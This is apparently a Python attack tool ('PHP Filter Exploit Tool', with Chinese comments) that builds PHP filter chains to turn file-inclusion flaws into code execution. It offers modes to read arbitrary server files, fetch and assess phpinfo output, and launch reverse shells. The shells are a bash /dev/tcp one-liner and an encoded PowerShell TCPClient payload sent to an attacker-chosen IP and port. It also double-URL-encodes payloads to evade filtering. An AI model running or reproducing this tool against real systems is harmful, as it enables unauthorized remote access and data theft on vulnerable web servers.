#!/usr/bin/env python3
import argparse
import base64
import re
from collections import defaultdict
from urllib.parse import quote

import requests
from bs4 import BeautifulSoup

# 定义要使用的 PHP 文件流
file_to_use = "php://temp"

# 定义一个字典，存储每个 Base64 字符（0-9, A-Z, a-z, +, /）对应的 PHP 过滤器转换链
# 这些转换链用于在 PHP 过滤器中逐步构建目标 Base64 字符串
conversions = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': '' # 等号在 Base64 编码中用于填充，这里设置为空字符串，因为过滤器链会处理掉它们
}

def build_file_url(base_url, filename):
    payload = f"php://filter/read=convert.base64-encode/resource={filename}"
    return f"{base_url}{quote(payload)}"

def parse_headers(header_args):
    headers = {}
    for h in header_args or []:
        if ':' not in h:
            raise ValueError(f"Invalid header format: {h}")
        key, value = h.split(':', 1)
        headers[key.strip()] = value.strip()
    return headers

def build_reverse_shell_url(base_url, ip, port, os, chain, encode_chars=None, encode_chars2=None) :
    php_filter_prefix = "php://filter/"
    filter_content = chain
    if os == "linux":
        cmd_payload = "&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22"
    else:

        raw_cmd_payload = (
            f"%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient(%27{ip}%27%2C{port})%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile((%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String)%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20(pwd).Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24client.Close()"
        )
        cmd_payload = '&cmd=powershell%20-e%20' + base64.b64encode(raw_cmd_payload.encode()).decode()

    # 第一次编码
    if encode_chars is not None:
        chars_to_encode = set(encode_chars.split(','))
        # 保持 php://filter/ 不变
        encoded_filter_content = ''.join(f'%{ord(c):02X}' if c in chars_to_encode else c for c in filter_content)
        encoded_prefix = php_filter_prefix + encoded_filter_content
    else:
        encoded_prefix = filter_content

    # 第二次编码
    if encode_chars2 is not None:
        chars_to_encode2 = set(encode_chars2.split(','))
        final_prefix = php_filter_prefix  # 先保存 php://filter/ 部分

        i = len(php_filter_prefix)
        while i < len(encoded_prefix):
            if encoded_prefix[i] == '%' and i + 2 < len(encoded_prefix):
                hex_part = encoded_prefix[i:i + 3]
                if '%' in chars_to_encode2:
                    final_prefix += f'%25{hex_part[1:3]}'
                else:
                    final_prefix += hex_part
                i += 3
            elif encoded_prefix[i] in chars_to_encode2:
                final_prefix += f'%{ord(encoded_prefix[i]):02X}'
                i += 1
            else:
                final_prefix += encoded_prefix[i]
                i += 1

        payload = final_prefix + cmd_payload.format(ip=ip, port=port)
    else:
        payload = encoded_prefix + cmd_payload.format(ip=ip, port=port)

    return f"{base_url}{payload}"

def analysis_phpinfo(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    security_params = defaultdict(dict)
    php_version = soup.find('h1', class_='p')
    if php_version:
        version_text = php_version.text
        version_match = re.search(r'PHP Version (\d+\.\d+\.\d+)', version_text)
        if version_match:
            security_params['基本信息']['PHP版本'] = version_match.group(1)
    system_info = soup.find('td', string='System').find_next('td', class_='v') if soup.find('td',
                                                                                            string='System') else None
    if system_info:
        security_params['基本信息']['系统'] = system_info.text.strip()

    apache_version = soup.find('td', string='Apache Version').find_next('td', class_='v') if soup.find('td',
                                                                                                       string='Apache Version') else None
    if apache_version:
        security_params['基本信息']['Apache版本'] = apache_version.text.strip()

    # 提取服务器API
    server_api = soup.find('td', string='Server API').find_next('td', class_='v') if soup.find('td',
                                                                                               string='Server API') else None
    if server_api:
        security_params['基本信息']['服务器API'] = server_api.text.strip()

    # 安全相关配置
    security_params['安全配置'] = {}

    # 关键安全参数列表
    security_keys = [
        'allow_url_fopen', 'allow_url_include', 'display_errors', 'expose_php',
        'disable_functions', 'open_basedir', 'safe_mode', 'register_globals',
        'file_uploads', 'upload_max_filesize', 'max_file_uploads', 'post_max_size',
        'memory_limit', 'max_execution_time', 'session.use_cookies', 'session.use_only_cookies',
        'session.cookie_httponly', 'session.cookie_secure', 'session.use_strict_mode',
        'session.use_trans_sid', 'session.gc_maxlifetime', 'error_reporting',
        'log_errors', 'error_log', 'doc_root', 'user_dir', 'cgi.force_redirect',
        'enable_dl', 'allow_webdav_methods'
    ]
    # 遍历所有表格行，查找安全相关配置
    for row in soup.find_all('tr'):
        cells = row.find_all('td')
        if len(cells) >= 2:
            param_name = cells[0].text.strip()

            # 检查是否是我们关注的安全参数
            for key in security_keys:
                if key == param_name or key in param_name:
                    param_value = cells[1].text.strip()
                    security_params['安全配置'][param_name] = param_value

    # 提取已注册的PHP流
    registered_streams = soup.find('td', string='Registered PHP Streams').find_next('td', class_='v') if soup.find('td',
                                                                                                                   string='Registered PHP Streams') else None
    if registered_streams:
        security_params['PHP流'] = {}
        security_params['PHP流']['已注册的PHP流'] = registered_streams.text.strip()

    # 提取已注册的流过滤器
    registered_filters = soup.find('td', string='Registered Stream Filters').find_next('td', class_='v') if soup.find(
        'td', string='Registered Stream Filters') else None
    if registered_filters:
        if 'PHP流' not in security_params:
            security_params['PHP流'] = {}
        security_params['PHP流']['已注册的流过滤器'] = registered_filters.text.strip()

    # 提取已加载的模块
    loaded_modules = soup.find('td', string='Loaded Modules').find_next('td', class_='v') if soup.find('td',
                                                                                                       string='Loaded Modules') else None
    if loaded_modules:
        security_params['模块'] = {}
        security_params['模块']['已加载模块'] = loaded_modules.text.strip()

    # 提取用户/组信息
    user_group = soup.find('td', string='User/Group').find_next('td', class_='v') if soup.find('td',
                                                                                               string='User/Group') else None
    if user_group:
        security_params['基本信息']['用户/组'] = user_group.text.strip()

    # 提取服务器根目录
    server_root = soup.find('td', string='Server Root').find_next('td', class_='v') if soup.find('td',
                                                                                                 string='Server Root') else None
    if server_root:
        security_params['基本信息']['服务器根目录'] = server_root.text.strip()

    print("=" * 10)
    print("PHP安全相关参数分析报告")
    print("=" * 10)

    for category, params in security_params.items():
        print(f"\n## {category}")
        print("-" * 10)

        for param_name, param_value in params.items():
            print(f"{param_name}: {param_value}")

    print("\n" + "=" * 10)
    print("安全建议:")
    print("-" * 10)

    # 基于提取的参数给出安全建议
    if 'allow_url_fopen' in security_params.get('安全配置', {}) and security_params['安全配置'][
        'allow_url_fopen'] == 'On':
        print("- [高风险] allow_url_fopen 已启用，这可能导致远程文件包含漏洞。")

    if 'allow_url_include' in security_params.get('安全配置', {}) and security_params['安全配置'][
        'allow_url_include'] == 'On':
        print("- [高风险] allow_url_include 已启用，这会导致严重的远程文件包含漏洞。")

    if 'display_errors' in security_params.get('安全配置', {}) and security_params['安全配置'][
        'display_errors'] == 'On':
        print("- [中风险] display_errors 已启用，这可能泄露敏感信息。")

    if 'expose_php' in security_params.get('安全配置', {}) and security_params['安全配置']['expose_php'] == 'On':
        print("- [低风险] expose_php 已启用，这会在HTTP头中暴露PHP版本信息。")

    if 'disable_functions' in security_params.get('安全配置', {}) and (
            not security_params['安全配置']['disable_functions'] or security_params['安全配置'][
        'disable_functions'] == 'no value'):
        print("- [高风险] disable_functions 未设置，建议禁用危险函数如system, exec, shell_exec, passthru等。")

    if 'open_basedir' in security_params.get('安全配置', {}) and (
            not security_params['安全配置']['open_basedir'] or security_params['安全配置'][
        'open_basedir'] == 'no value'):
        print("- [中风险] open_basedir 未设置。")

    if 'PHP流' in security_params and 'php://' in security_params['PHP流'].get('已注册的PHP流', ''):
        print("- [注意] php:// 流包装器已启用，可能被用于PHP过滤器攻击。")

    if 'PHP流' in security_params and 'data://' in security_params['PHP流'].get('已注册的PHP流', ''):
        print("- [注意] data:// 流包装器已启用，可能被用于数据包装器攻击。")

    if 'PHP流' in security_params and 'phar://' in security_params['PHP流'].get('已注册的PHP流', ''):
        print("- [注意] phar:// 流包装器已启用，可能导致phar反序列化漏洞。")

    if 'PHP流' in security_params and 'convert.iconv.*' in security_params['PHP流'].get('已注册的流过滤器', ''):
        print("- [注意] convert.iconv.* 过滤器已启用，可能被用于PHP过滤器链攻击。")

    print("\n" + "=" * 10)

# 定义生成 PHP 过滤器链的函数
def generate_filter_chain(chain, debug_base64 = False):

    encoded_chain = chain
    # 初始化过滤器链，首先添加一个转换来生成一些初始的“垃圾”Base64 字符
    filters = "convert.iconv.UTF8.CSISO2022KR|"
    filters += "convert.base64-encode|"
    filters += "convert.iconv.UTF8.UTF7|"

    # 逆序遍历目标 Base64 字符串中的每个字符
    for c in encoded_chain[::-1]:
        # 添加对应字符的转换链
        filters += conversions[c] + "|"
        # 先 Base64 解码，移除无效的 Base64 字符
        filters += "convert.base64-decode|"
        # 再 Base64 编码，确保结果是有效的 Base64
        filters += "convert.base64-encode|"
        # 再次使用 UTF8 到 UTF7 转换移除可能产生的 '='
        filters += "convert.iconv.UTF8.UTF7|"

    # 如果不是调试模式
    if not debug_base64:
        # 在过滤器链末尾添加 Base64 解码器，以获取最终的原始数据
        filters += "convert.base64-decode"

    # 构建最终的 PHP 过滤器 URL
    final_payload = f"php://filter/{filters}/resource={file_to_use}"
    return final_payload

# 主函数入口
def main():

    # 创建命令行参数解析器
    parser = argparse.ArgumentParser(description="PHP Filter Exploit Tool")

    # 添加 --chain 参数，用于指定要编码的原始字符串
    parser.add_argument("--chain",
                        help="您想执行的 php 代码", required=False)

    # 添加 --rawbase64 参数，用于直接测试 Base64 字符串，方便调试
    parser.add_argument("--rawbase64",
                        help="输入一个 base64 的值，链将由 PHP 以 Base64 形式打印", required=False)

    parser.add_argument("--headers", action='append',
                        help='Custom HTTP headers (e.g. -H "Authorization: Basic ...")')

    parser.add_argument('--os', choices=['linux', 'windows'], default='linux',
                        help='Target OS (linux or windows), default: linux')
    parser.add_argument('--url', help='Base URL (e.g. http://example.com/path?parameter=)')
    parser.add_argument('--encode', help='url encode first time', required=False)
    parser.add_argument('--encode2', help='url encode second time', required=False)
    # 功能组
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--payload-only",help="只输出构造好的payload")
    group.add_argument('--phpinfo',choices=['raw','analysis'],help="phpinfo")
    group.add_argument('--file-to-read', help='要读取的文件')
    group.add_argument('--reverse-shell', nargs=2, metavar=('IP', 'PORT'),
                       help='Reverse shell IP and PORT.')


    # 解析命令行参数
    args = parser.parse_args()

    if args.headers is not None:
        headers = parse_headers(args.headers)
    else:
        headers = {}

    if args.file_to_read:
        url = build_file_url(args.base_url, args.file_to_read)
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            response_text = response.text.strip()
            if not response_text:
                print("Received empty response.")
            else:
                decoded = base64.b64decode(response_text).decode('utf-8',
                                                                 errors='ignore')
                print(f"Decoded content:\n{decoded}")
        else:
            print(f"Request failed with status code: {response.status_code}")
            print(f"Response content:\n{response.text}")  # 打印失败时的响应内容
        exit(0)

    chain = ''

    if args.phpinfo is not None:
        payload = '<?php phpinfo();?>'
        chain = payload.encode('utf-8')
        base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
        chain = generate_filter_chain(base64_value)
        url = args.url + chain
        response = requests.get(url=url,headers=headers, timeout=10, allow_redirects=True)
        if response.status_code == 200:
            response_text = response.text.strip()
            if args.phpinfo == 'raw':
                print(f'结果:{response_text}')
            if args.phpinfo == 'analysis':
                analysis_phpinfo(response_text)
                exit(0)


    # 如果提供了 --chain 参数
    if args.chain is not None:
        # 将输入字符串编码为 UTF-8 字节串
        chain = args.chain.encode('utf-8')
        # 对字节串进行 Base64 编码，并移除末尾的 '=' 填充符
        base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
        # 使用生成的 Base64 字符串生成过滤器链
        chain = generate_filter_chain(base64_value)
        # 打印生成的过滤器链和相关信息
        print("[+] 以下 gadget 链将生成以下代码 : {} (base64 value: {})".format(args.chain, base64_value))
        print(chain)

    # 如果提供了 --rawbase64 参数
    if args.rawbase64 is not None and args.chain is None:
        # 移除输入的 Base64 字符串中的 '=' 填充符
        rawbase64 = args.rawbase64.replace("=", "")
        # 使用正则表达式验证输入是否为有效的 Base64 字符串（只包含 A-Z, a-z, 0-9, +, /）
        match = re.search("^([A-Za-z0-9+/])*$", rawbase64)
        # 如果验证通过
        if match:
            # 生成用于调试的过滤器链（启用 debug_base64=True）
            chain = generate_filter_chain(rawbase64, True)
            # 打印生成的过滤器链
            print(chain)
        # 如果验证失败
        else:
            # 打印错误信息并退出
            print ("[-] 需要 Base64 字符串。")
            exit(1)

    if args.payload_only:
        exit(0)

    try:
        headers = parse_headers(args.headers)
        if args.reverse_shell:
            ip, port = args.reverse_shell

            payload = build_reverse_shell_url(args.url, ip, port, args.os, chain, args.encode, args.encode2)
            print(f"[*] URL: {payload}")  # 打印生成的 URL 以供调试
            print(f"[*] 尝试发送 reverse shell 往 {ip}:{port}...")
            try:
                # 超时重定向
                response = requests.get(url=payload, headers=headers, timeout=10, allow_redirects=True, )
                print(f"[*] Request sent. Status code: {response.status_code}")
            except requests.exceptions.Timeout:
                print("[!] Request timed out.")
            except requests.exceptions.RequestException as e:
                print(f"[!] Request error during reverse shell attempt: {e}")


    except ValueError as e:
        print(f"Header error: {e}")
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
    except Exception as e:
        print(f"Error: {e}")


# 当脚本作为主程序运行时执行 main 函数
if __name__ == "__main__":
    main()